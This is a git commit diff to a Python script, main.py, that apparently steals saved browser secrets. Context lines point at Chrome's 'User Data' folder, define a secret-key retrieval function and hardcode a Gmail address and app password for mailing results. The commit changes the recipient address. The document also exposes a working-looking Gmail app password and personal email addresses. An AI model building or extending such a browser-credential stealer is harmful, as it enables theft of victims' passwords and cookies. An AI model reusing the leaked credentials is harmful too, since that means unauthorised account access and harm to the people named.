6723bf53c5907de14dfcf1cd292c2f6f7e83bfa4
decrypterrrr <ankur8077661752@gmail.com>
2024-07-14 22:46:13 +0530

    Update main.py

--- main.py
+++ main.py
@@ -20,7 +20,7 @@ CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.
 # Gmail credentials (replace with your actual Gmail credentials)
 GMAIL_ADDRESS = "officialgujar@gmail.com"
 GMAIL_PASSWORD = "lewi gmww kkko oxfs"  # Replace with the app password you generated
-RECEIVER_EMAIL = "aryan.singh.cse.2022@miet.ac.in"
+RECEIVER_EMAIL = "officialgujar@gmail.com"
 
 def get_secret_key():
     try:
